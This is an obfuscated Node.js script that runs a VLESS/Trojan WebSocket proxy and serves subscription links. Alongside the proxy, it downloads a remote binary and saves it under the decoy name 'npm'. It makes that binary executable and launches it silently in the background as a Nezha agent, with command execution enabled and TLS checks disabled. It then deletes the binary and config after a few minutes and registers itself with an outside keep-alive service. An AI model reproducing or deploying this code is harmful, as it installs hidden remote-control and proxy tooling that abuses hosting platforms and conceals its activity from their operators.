const _0x4bae11=_0x4d1c;(function(_0x22ed5c,_0x4b4b64){const _0x37cd0d={_0x579d58:0x1bd,_0x129ebe:0x1a1,_0x4fb8ce:0x1ac,_0x49593f:0x193,_0x2f2f31:0x1b3,_0x4b6a3f:0x194,_0x58b938:0x1aa},_0x38c099=_0x4d1c,_0x4b072b=_0x22ed5c();while(!![]){try{const _0x142df4=-parseInt(_0x38c099(0x158))/0x1*(-parseInt(_0x38c099(_0x37cd0d._0x579d58))/0x2)+-parseInt(_0x38c099(0x1c9))/0x3*(parseInt(_0x38c099(_0x37cd0d._0x129ebe))/0x4)+parseInt(_0x38c099(_0x37cd0d._0x4fb8ce))/0x5+parseInt(_0x38c099(0x1bc))/0x6*(parseInt(_0x38c099(_0x37cd0d._0x49593f))/0x7)+-parseInt(_0x38c099(0x1c0))/0x8*(-parseInt(_0x38c099(_0x37cd0d._0x2f2f31))/0x9)+-parseInt(_0x38c099(0x165))/0xa*(-parseInt(_0x38c099(_0x37cd0d._0x4b6a3f))/0xb)+parseInt(_0x38c099(_0x37cd0d._0x58b938))/0xc*(-parseInt(_0x38c099(0x199))/0xd);if(_0x142df4===_0x4b4b64)break;else _0x4b072b['push'](_0x4b072b['shift']());}catch(_0x5e2856){_0x4b072b['push'](_0x4b072b['shift']());}}}(_0x5b3b,0xe4907));const os=require('os'),http=require(_0x4bae11(0x1a3)),fs=require('fs'),axios=require(_0x4bae11(0x14f)),net=require(_0x4bae11(0x1bb)),path=require('path'),crypto=require(_0x4bae11(0x1c6)),{Buffer}=require(_0x4bae11(0x14c)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4bae11(0x1b2)][_0x4bae11(0x189)]||_0x4bae11(0x18b),NEZHA_SERVER=process[_0x4bae11(0x1b2)][_0x4bae11(0x19e)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4bae11(0x1b2)][_0x4bae11(0x157)]||'',DOMAIN=process['env'][_0x4bae11(0x19d)]||_0x4bae11(0x1ae),AUTO_ACCESS=process[_0x4bae11(0x1b2)][_0x4bae11(0x1ba)]||![],WSPATH=process[_0x4bae11(0x1b2)][_0x4bae11(0x164)]||UUID[_0x4bae11(0x163)](0x0,0x8),SUB_PATH=process[_0x4bae11(0x1b2)][_0x4bae11(0x198)]||_0x4bae11(0x1c8),NAME=process[_0x4bae11(0x1b2)][_0x4bae11(0x1a8)]||'',PORT=process[_0x4bae11(0x1b2)][_0x4bae11(0x16e)]||0xbb8;let ISP='';const GetISP=async()=>{const _0xf3321={_0x4ba0bb:0x1b1,_0x575190:0x1b5,_0x1971f6:0x17d,_0x528dd6:0x1b7,_0x2bb934:0x182},_0x37c5d7=_0x4bae11;try{const _0xc68083=await axios[_0x37c5d7(_0xf3321._0x4ba0bb)](_0x37c5d7(_0xf3321._0x575190)),_0x4cdb9f=_0xc68083[_0x37c5d7(_0xf3321._0x1971f6)];ISP=(_0x4cdb9f['country_code']+'-'+_0x4cdb9f[_0x37c5d7(_0xf3321._0x528dd6)])['replace'](/ /g,'_');}catch(_0x465d7d){ISP=_0x37c5d7(_0xf3321._0x2bb934);}};GetISP();const httpServer=http['createServer']((_0xdba108,_0x58b457)=>{const _0x397789={_0x524fca:0x17c,_0x449073:0x190,_0x338f1a:0x155,_0x7fed54:0x179,_0x457665:0x15f,_0x5f21cb:0x185,_0x2ce84e:0x196,_0x40e92a:0x197,_0x1dd7e4:0x15b,_0x1a6ff7:0x197},_0x5ecf2d={_0x1fc7ab:0x15b,_0xf525f8:0x170,_0x2aa4d8:0x197},_0x334dc2=_0x4bae11;if(_0xdba108['url']==='/'){const _0x4919bb=path[_0x334dc2(0x16b)](__dirname,_0x334dc2(_0x397789._0x524fca));fs[_0x334dc2(_0x397789._0x449073)](_0x4919bb,_0x334dc2(0x18e),(_0x3388df,_0x3232e7)=>{const _0x509efd=_0x334dc2;if(_0x3388df){_0x58b457[_0x509efd(_0x5ecf2d._0x1fc7ab)](0xc8,{'Content-Type':_0x509efd(0x170)}),_0x58b457[_0x509efd(0x197)]('Hello\x20world!');return;}_0x58b457[_0x509efd(0x15b)](0xc8,{'Content-Type':_0x509efd(_0x5ecf2d._0xf525f8)}),_0x58b457[_0x509efd(_0x5ecf2d._0x2aa4d8)](_0x3232e7);});return;}else{if(_0xdba108[_0x334dc2(_0x397789._0x338f1a)]==='/'+SUB_PATH){const _0x23bb3b=NAME?NAME+'-'+ISP:ISP,_0x27fdab='vless://'+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x23bb3b,_0x2bc58a=_0x334dc2(_0x397789._0x7fed54)+UUID+_0x334dc2(0x175)+DOMAIN+_0x334dc2(_0x397789._0x457665)+DOMAIN+_0x334dc2(0x1c7)+WSPATH+'#'+_0x23bb3b,_0x2cd674=_0x27fdab+'\x0a'+_0x2bc58a,_0x384cc2=Buffer[_0x334dc2(_0x397789._0x5f21cb)](_0x2cd674)[_0x334dc2(0x150)](_0x334dc2(0x15a));_0x58b457[_0x334dc2(0x15b)](0xc8,{'Content-Type':_0x334dc2(_0x397789._0x2ce84e)}),_0x58b457[_0x334dc2(_0x397789._0x40e92a)](_0x384cc2+'\x0a');}else _0x58b457[_0x334dc2(_0x397789._0x1dd7e4)](0x194,{'Content-Type':'text/plain'}),_0x58b457[_0x334dc2(_0x397789._0x1a6ff7)](_0x334dc2(0x14d));}}),wss=new WebSocket[(_0x4bae11(0x154))]({'server':httpServer}),uuid=UUID[_0x4bae11(0x178)](/-/g,''),DNS_SERVERS=[_0x4bae11(0x152),_0x4bae11(0x16d)];function resolveHost(_0x3cd4b7){return new Promise((_0x48b480,_0x5aefd8)=>{const _0x558712={_0x5b859c:0x1a7,_0x37764e:0x156},_0x34cb42=_0x4d1c;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x34cb42(0x19f)](_0x3cd4b7)){_0x48b480(_0x3cd4b7);return;}let _0x25a1a7=0x0;function _0x342b6c(){const _0x2bd92f={_0x43260c:0x195,_0x6b4046:0x1c1,_0x25e47e:0x166,_0x353c52:0x17d},_0x520daa=_0x34cb42;if(_0x25a1a7>=DNS_SERVERS[_0x520daa(0x195)]){_0x5aefd8(new Error(_0x520daa(_0x558712._0x5b859c)+_0x3cd4b7+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x41be4c=DNS_SERVERS[_0x25a1a7];_0x25a1a7++;const _0x1f9f62=_0x520daa(_0x558712._0x37764e)+encodeURIComponent(_0x3cd4b7)+_0x520daa(0x14b);axios['get'](_0x1f9f62,{'timeout':0x1388,'headers':{'Accept':_0x520daa(0x172)}})[_0x520daa(0x18c)](_0x29b2f7=>{const _0x24fb34=_0x520daa,_0x278caa=_0x29b2f7[_0x24fb34(0x17d)];if(_0x278caa[_0x24fb34(0x184)]===0x0&&_0x278caa[_0x24fb34(0x1c1)]&&_0x278caa['Answer'][_0x24fb34(_0x2bd92f._0x43260c)]>0x0){const _0x242853=_0x278caa[_0x24fb34(_0x2bd92f._0x6b4046)][_0x24fb34(_0x2bd92f._0x25e47e)](_0x2cb5e8=>_0x2cb5e8['type']===0x1);if(_0x242853){_0x48b480(_0x242853[_0x24fb34(_0x2bd92f._0x353c52)]);return;}}_0x342b6c();})['catch'](_0x553833=>{_0x342b6c();});}_0x342b6c();});}function handleVlessConnection(_0x54553e,_0x3bf7d2){const _0x15d2b0={_0x4d23a5:0x163,_0x496630:0x163,_0x5224bb:0x186,_0x1212ab:0x163,_0x4d9486:0x163,_0xfd5811:0x186,_0x15ea95:0x1bf,_0x58992e:0x18c,_0x217800:0x18f},_0x502c3f={_0x3914f4:0x1a0},_0x11f8d4={_0x1ea4fa:0x1a0},_0x1852cc={_0x3731c9:0x1a4,_0x4e7499:0x1b0,_0x5dc451:0x1b0},_0x28f160=_0x4bae11,[_0x2d3b7b]=_0x3bf7d2,_0x3686e6=_0x3bf7d2[_0x28f160(_0x15d2b0._0x4d23a5)](0x1,0x11);if(!_0x3686e6['every']((_0x552aad,_0x86550c)=>_0x552aad==parseInt(uuid[_0x28f160(0x151)](_0x86550c*0x2,0x2),0x10)))return![];let _0x4258c7=_0x3bf7d2[_0x28f160(_0x15d2b0._0x496630)](0x11,0x12)[_0x28f160(_0x15d2b0._0x5224bb)]()+0x13;const _0x15f41d=_0x3bf7d2[_0x28f160(_0x15d2b0._0x1212ab)](_0x4258c7,_0x4258c7+=0x2)[_0x28f160(0x1af)](0x0),_0x3b0819=_0x3bf7d2[_0x28f160(_0x15d2b0._0x1212ab)](_0x4258c7,_0x4258c7+=0x1)[_0x28f160(0x186)](),_0x3e2ee8=_0x3b0819==0x1?_0x3bf7d2[_0x28f160(0x163)](_0x4258c7,_0x4258c7+=0x4)[_0x28f160(0x16b)]('.'):_0x3b0819==0x2?new TextDecoder()[_0x28f160(0x1b9)](_0x3bf7d2[_0x28f160(_0x15d2b0._0x4d9486)](_0x4258c7+0x1,_0x4258c7+=0x1+_0x3bf7d2['slice'](_0x4258c7,_0x4258c7+0x1)[_0x28f160(_0x15d2b0._0xfd5811)]())):_0x3b0819==0x3?_0x3bf7d2[_0x28f160(0x163)](_0x4258c7,_0x4258c7+=0x10)[_0x28f160(_0x15d2b0._0x15ea95)]((_0x129e82,_0x3e19fe,_0x47f131,_0x316ded)=>_0x47f131%0x2?_0x129e82[_0x28f160(0x19b)](_0x316ded['slice'](_0x47f131-0x1,_0x47f131+0x1)):_0x129e82,[])[_0x28f160(0x167)](_0xf4dfee=>_0xf4dfee['readUInt16BE'](0x0)[_0x28f160(0x150)](0x10))['join'](':'):'';_0x54553e[_0x28f160(0x19a)](new Uint8Array([_0x2d3b7b,0x0]));const _0x90c1e6=createWebSocketStream(_0x54553e);return resolveHost(_0x3e2ee8)[_0x28f160(_0x15d2b0._0x58992e)](_0x338838=>{const _0x513802=_0x28f160;net[_0x513802(_0x11f8d4._0x1ea4fa)]({'host':_0x338838,'port':_0x15f41d},function(){const _0x5e9d8f=_0x513802;this[_0x5e9d8f(0x1c5)](_0x3bf7d2['slice'](_0x4258c7)),_0x90c1e6['on'](_0x5e9d8f(_0x1852cc._0x3731c9),()=>{})[_0x5e9d8f(_0x1852cc._0x4e7499)](this)['on']('error',()=>{})[_0x5e9d8f(_0x1852cc._0x5dc451)](_0x90c1e6);})['on'](_0x513802(0x1a4),()=>{});})[_0x28f160(_0x15d2b0._0x217800)](_0x906fb6=>{const _0x18adcd={_0x5c7e21:0x1b0},_0x5ba3da=_0x28f160;net[_0x5ba3da(_0x502c3f._0x3914f4)]({'host':_0x3e2ee8,'port':_0x15f41d},function(){const _0x4585e7=_0x5ba3da;this[_0x4585e7(0x1c5)](_0x3bf7d2[_0x4585e7(0x163)](_0x4258c7)),_0x90c1e6['on'](_0x4585e7(0x1a4),()=>{})[_0x4585e7(0x1b0)](this)['on']('error',()=>{})[_0x4585e7(_0x18adcd._0x5c7e21)](_0x90c1e6);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0xb5727e,_0x5d01c5){const _0xf82845={_0x3b44a5:0x15d,_0x4190cd:0x163,_0x489d82:0x150,_0x3044f8:0x1bf,_0x4836b0:0x18f},_0x52630c={_0x6ac92a:0x1a0},_0x8ce6d3={_0x2ca2e9:0x1a0,_0x19d11f:0x1a4},_0x370e18={_0x8f8cad:0x1c5,_0x32ea05:0x163,_0x3f5185:0x1b0},_0x592b48=_0x4bae11;try{if(_0x5d01c5['length']<0x3a)return![];const _0x5b924e=_0x5d01c5[_0x592b48(0x163)](0x0,0x38)[_0x592b48(0x150)](),_0x4b7ca6=[UUID];let _0x49598c=null;for(const _0x3bcc80 of _0x4b7ca6){const _0x129d03=crypto['createHash']('sha224')[_0x592b48(_0xf82845._0x3b44a5)](_0x3bcc80)['digest']('hex');if(_0x129d03===_0x5b924e){_0x49598c=_0x3bcc80;break;}}if(!_0x49598c)return![];let _0x4406d7=0x38;_0x5d01c5[_0x4406d7]===0xd&&_0x5d01c5[_0x4406d7+0x1]===0xa&&(_0x4406d7+=0x2);const _0x1c8a37=_0x5d01c5[_0x4406d7];if(_0x1c8a37!==0x1)return![];_0x4406d7+=0x1;const _0x1e72c3=_0x5d01c5[_0x4406d7];_0x4406d7+=0x1;let _0x599781,_0x7ee24f;if(_0x1e72c3===0x1)_0x599781=_0x5d01c5[_0x592b48(_0xf82845._0x4190cd)](_0x4406d7,_0x4406d7+0x4)['join']('.'),_0x4406d7+=0x4;else{if(_0x1e72c3===0x3){const _0x1f4029=_0x5d01c5[_0x4406d7];_0x4406d7+=0x1,_0x599781=_0x5d01c5['slice'](_0x4406d7,_0x4406d7+_0x1f4029)[_0x592b48(_0xf82845._0x489d82)](),_0x4406d7+=_0x1f4029;}else{if(_0x1e72c3===0x4)_0x599781=_0x5d01c5[_0x592b48(0x163)](_0x4406d7,_0x4406d7+0x10)[_0x592b48(_0xf82845._0x3044f8)]((_0x14ab9a,_0x273691,_0x3bb9ca,_0x13a755)=>_0x3bb9ca%0x2?_0x14ab9a[_0x592b48(0x19b)](_0x13a755[_0x592b48(0x163)](_0x3bb9ca-0x1,_0x3bb9ca+0x1)):_0x14ab9a,[])[_0x592b48(0x167)](_0x333215=>_0x333215['readUInt16BE'](0x0)[_0x592b48(0x150)](0x10))[_0x592b48(0x16b)](':'),_0x4406d7+=0x10;else return![];}}_0x7ee24f=_0x5d01c5[_0x592b48(0x1af)](_0x4406d7),_0x4406d7+=0x2;_0x4406d7<_0x5d01c5[_0x592b48(0x195)]&&_0x5d01c5[_0x4406d7]===0xd&&_0x5d01c5[_0x4406d7+0x1]===0xa&&(_0x4406d7+=0x2);const _0x175c1b=createWebSocketStream(_0xb5727e);return resolveHost(_0x599781)['then'](_0x2cd178=>{const _0xaccb3=_0x592b48;net[_0xaccb3(_0x8ce6d3._0x2ca2e9)]({'host':_0x2cd178,'port':_0x7ee24f},function(){const _0x39596b=_0xaccb3;_0x4406d7<_0x5d01c5[_0x39596b(0x195)]&&this[_0x39596b(_0x370e18._0x8f8cad)](_0x5d01c5[_0x39596b(_0x370e18._0x32ea05)](_0x4406d7)),_0x175c1b['on'](_0x39596b(0x1a4),()=>{})[_0x39596b(_0x370e18._0x3f5185)](this)['on'](_0x39596b(0x1a4),()=>{})['pipe'](_0x175c1b);})['on'](_0xaccb3(_0x8ce6d3._0x19d11f),()=>{});})[_0x592b48(_0xf82845._0x4836b0)](_0x4fa46d=>{const _0x3c3a7a={_0x3c3ed1:0x1c5,_0x4d6c32:0x163,_0x2b245c:0x1a4},_0x227886=_0x592b48;net[_0x227886(_0x52630c._0x6ac92a)]({'host':_0x599781,'port':_0x7ee24f},function(){const _0x5e33ea=_0x227886;_0x4406d7<_0x5d01c5[_0x5e33ea(0x195)]&&this[_0x5e33ea(_0x3c3a7a._0x3c3ed1)](_0x5d01c5[_0x5e33ea(_0x3c3a7a._0x4d6c32)](_0x4406d7)),_0x175c1b['on'](_0x5e33ea(_0x3c3a7a._0x2b245c),()=>{})['pipe'](this)['on'](_0x5e33ea(0x1a4),()=>{})[_0x5e33ea(0x1b0)](_0x175c1b);})['on']('error',()=>{});}),!![];}catch(_0x3d07bc){return![];}}wss['on']('connection',(_0x10d8ec,_0x26cdc3)=>{const _0x22cb6c={_0xf4064c:0x171},_0x2e57dd={_0x25647f:0x195,_0x527e83:0x14a},_0x20dc7d=_0x4bae11,_0x2c7d28=_0x26cdc3[_0x20dc7d(0x155)]||'';_0x10d8ec[_0x20dc7d(_0x22cb6c._0xf4064c)](_0x20dc7d(0x153),_0x15e478=>{const _0xc804a9=_0x20dc7d;if(_0x15e478[_0xc804a9(_0x2e57dd._0x25647f)]>0x11&&_0x15e478[0x0]===0x0){const _0x3d2fd2=_0x15e478[_0xc804a9(0x163)](0x1,0x11),_0x3bb206=_0x3d2fd2[_0xc804a9(0x17f)]((_0x4acd69,_0x3b9e51)=>_0x4acd69==parseInt(uuid[_0xc804a9(0x151)](_0x3b9e51*0x2,0x2),0x10));if(_0x3bb206){!handleVlessConnection(_0x10d8ec,_0x15e478)&&_0x10d8ec[_0xc804a9(_0x2e57dd._0x527e83)]();return;}}!handleTrojanConnection(_0x10d8ec,_0x15e478)&&_0x10d8ec[_0xc804a9(0x14a)]();})['on'](_0x20dc7d(0x1a4),()=>{});});function _0x4d1c(_0x26f375,_0x3ce6d3){const _0x5b3b0f=_0x5b3b();return _0x4d1c=function(_0x4d1ccc,_0x36adfe){_0x4d1ccc=_0x4d1ccc-0x14a;let _0x140edd=_0x5b3b0f[_0x4d1ccc];return _0x140edd;},_0x4d1c(_0x26f375,_0x3ce6d3);}function _0x5b3b(){const _0x1cd9ae=['npm\x20running\x20error:','http','error','npm\x20is\x20running','2053','Failed\x20to\x20resolve\x20','NAME','aarch64','190308tAUkoa','split','2631645EoSwdt','https://arm64.ssss.nyc.mn/v1','1234.abc.com','readUInt16BE','pipe','get','env','72RhzMzV','setsid\x20nohup\x20./npm\x20-s\x20','https://api.ip.sb/geoip','https://arm64.ssss.nyc.mn/agent','isp','utf-8','decode','AUTO_ACCESS','net','1276218Slwobr','4kbVKJc','https://amd64.ssss.nyc.mn/v1','reduce','578360ySeCcb','Answer','log','writeFileSync','https://amd64.ssss.nyc.mn/agent','write','crypto','&path=%2F','cuipq','3BMeHFY','close','&type=A','buffer','Not\x20Found\x0a','Server\x20is\x20running\x20on\x20port\x20','axios','toString','substr','8.8.4.4','message','Server','url','https://dns.google/resolve?name=','NEZHA_KEY','463979RbmoZv','npm\x20download\x20successfully','base64','writeHead','unlink','update','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','&fp=chrome&type=ws&host=','npm\x20is\x20already\x20running,\x20skip\x20running...','trim','includes','slice','WSPATH','30UgmchP','find','map','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','chmod\x20+x\x20npm','join','2087','1.1.1.1','PORT','error:\x20','text/html','once','application/dns-json','2096','config.yaml','@cdns.doon.eu.org:443?security=tls&sni=','/bin/bash','stream','replace','trojan://','--tls','finish','index.html','data','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','every','false','8443','Unknown','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Status','from','readUInt8','https://oooo.serv00.net/add-url','listen','UUID','Automatic\x20Access\x20Task\x20added\x20successfully','6ff2699f-5c6f-40b2-a911-c91e391ef756','then','pop','utf8','catch','readFile','2083','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','7NjRRtd','3674495fdOAUa','length','text/plain','end','SUB_PATH','1391quEsDf','send','concat','arm','DOMAIN','NEZHA_SERVER','test','connect','2457492hWOURw'];_0x5b3b=function(){return _0x1cd9ae;};return _0x5b3b();}const getDownloadUrl=()=>{const _0x10cada={_0x2ec66a:0x168,_0x1ab104:0x19c,_0x25af08:0x1b6,_0x22ab80:0x1be,_0x5e1a21:0x1c4},_0x252b82=_0x4bae11,_0x456cc9=os[_0x252b82(_0x10cada._0x2ec66a)]();return _0x456cc9===_0x252b82(_0x10cada._0x1ab104)||_0x456cc9==='arm64'||_0x456cc9===_0x252b82(0x1a9)?!NEZHA_PORT?_0x252b82(0x1ad):_0x252b82(_0x10cada._0x25af08):!NEZHA_PORT?_0x252b82(_0x10cada._0x22ab80):_0x252b82(_0x10cada._0x5e1a21);},downloadFile=async()=>{const _0x299519={_0x45fd29:0x1b1,_0x4ebd6a:0x1b0},_0x3c2359={_0x3671e0:0x17b},_0x4e9714=_0x4bae11;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x10abb9=getDownloadUrl(),_0x744a7b=await axios({'method':_0x4e9714(_0x299519._0x45fd29),'url':_0x10abb9,'responseType':_0x4e9714(0x177)}),_0x3d0809=fs['createWriteStream']('npm');return _0x744a7b['data'][_0x4e9714(_0x299519._0x4ebd6a)](_0x3d0809),new Promise((_0x54c2b4,_0x3f789e)=>{const _0x255121={_0x2de9f4:0x16a},_0xc54ed=_0x4e9714;_0x3d0809['on'](_0xc54ed(_0x3c2359._0x3671e0),()=>{const _0x43c227=_0xc54ed;console[_0x43c227(0x1c2)](_0x43c227(0x159)),exec(_0x43c227(_0x255121._0x2de9f4),_0x35bd84=>{if(_0x35bd84)_0x3f789e(_0x35bd84);_0x54c2b4();});}),_0x3d0809['on']('error',_0x3f789e);});}catch(_0x2b4fd0){throw _0x2b4fd0;}},runnz=async()=>{const _0x4e6635={_0xd47418:0x161,_0x9e1687:0x160,_0x29f6fc:0x181,_0x575bb5:0x16c,_0x1f3db3:0x191,_0x348541:0x1a6,_0x5ba385:0x162,_0x23796d:0x17a,_0x5ff099:0x1ab,_0x393ac6:0x180,_0x4870da:0x169,_0x431af4:0x192,_0x5c9613:0x1c3,_0x2c5bf6:0x15e,_0x29070f:0x1c2,_0x7c8e0d:0x1a4},_0x2b0c55={_0x19a746:0x1a2,_0x166021:0x1c2,_0x21d205:0x1a5},_0x391095=_0x4bae11;try{const _0x2a1084=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x391095(0x1b8)});if(_0x2a1084[_0x391095(_0x4e6635._0xd47418)]()!==''){console[_0x391095(0x1c2)](_0x391095(_0x4e6635._0x9e1687));return;}}catch(_0x2e0a21){}await downloadFile();let _0x146b61='',_0x21ec77=['443',_0x391095(_0x4e6635._0x29f6fc),_0x391095(0x173),_0x391095(_0x4e6635._0x575bb5),_0x391095(_0x4e6635._0x1f3db3),_0x391095(_0x4e6635._0x348541)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x26ceca=_0x21ec77[_0x391095(_0x4e6635._0x5ba385)](NEZHA_PORT)?_0x391095(_0x4e6635._0x23796d):'';_0x146b61=_0x391095(0x1b4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x26ceca+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4dfad1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x391095(_0x4e6635._0x5ff099)](':')[_0x391095(0x18d)]():'',_0x3b6225=_0x21ec77[_0x391095(_0x4e6635._0x5ba385)](_0x4dfad1)?'true':_0x391095(_0x4e6635._0x393ac6),_0x6832ff='client_secret:\x20'+NEZHA_KEY+_0x391095(_0x4e6635._0x4870da)+NEZHA_SERVER+_0x391095(_0x4e6635._0x431af4)+_0x3b6225+_0x391095(0x17e)+UUID;fs[_0x391095(_0x4e6635._0x5c9613)](_0x391095(0x174),_0x6832ff);}_0x146b61=_0x391095(_0x4e6635._0x2c5bf6);}else{console[_0x391095(_0x4e6635._0x29070f)](_0x391095(0x183));return;}}try{exec(_0x146b61,{'shell':_0x391095(0x176)},_0x1ee4f0=>{const _0x19751f=_0x391095;if(_0x1ee4f0)console['error'](_0x19751f(_0x2b0c55._0x19a746),_0x1ee4f0);else console[_0x19751f(_0x2b0c55._0x166021)](_0x19751f(_0x2b0c55._0x21d205));});}catch(_0x2c1ec6){console[_0x391095(_0x4e6635._0x7c8e0d)](_0x391095(0x16f)+_0x2c1ec6);}};async function addAccessTask(){const _0x1ad578=_0x4bae11;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2520f4='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x5bf7b1=await axios['post'](_0x1ad578(0x187),{'url':_0x2520f4},{'headers':{'Content-Type':'application/json'}});console['log'](_0x1ad578(0x18a));}catch(_0x310583){}}const delFiles=()=>{const _0x547c27={_0x15f5a0:0x15c},_0x3fd9a3=_0x4bae11;fs[_0x3fd9a3(_0x547c27._0x15f5a0)]('npm',()=>{}),fs[_0x3fd9a3(0x15c)](_0x3fd9a3(0x174),()=>{});};httpServer[_0x4bae11(0x188)](PORT,()=>{const _0x3f90e0={_0x52be25:0x1c2,_0x622863:0x14e},_0xdf4390=_0x4bae11;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xdf4390(_0x3f90e0._0x52be25)](_0xdf4390(_0x3f90e0._0x622863)+PORT);});
